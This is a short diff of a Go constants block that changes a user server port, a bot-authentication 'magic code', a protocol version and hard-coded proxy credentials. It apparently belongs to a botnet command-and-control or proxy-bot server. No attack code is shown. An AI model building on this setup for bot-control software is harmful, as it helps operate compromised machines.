@@ -39,15 +39,15 @@ const (
 
 	// Server ports
 	BOT_SERVER_PORT  = "443" // do not change
-	USER_SERVER_PORT = "210"
+	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "@E2Aryki*&QHaAqr"
-	PROTOCOL_VERSION = "v5.9"
+	MAGIC_CODE       = "4J*sgOVnQuQ@TpvT"
+	PROTOCOL_VERSION = "r3.7-stable"
 )
 
-var bakedProxyUser = "sRqn2362NNHJ" // change me run setup.py
-var bakedProxyPass = "hGNuLxxASMxC" // change me run setup.py
+var bakedProxyUser = "COGXeSPF3zja" // change me run setup.py
+var bakedProxyPass = "EJQE1vd8bpaB" // change me run setup.py
 
 // RelayEntry represents a relay in relays.json.
 type RelayEntry struct {
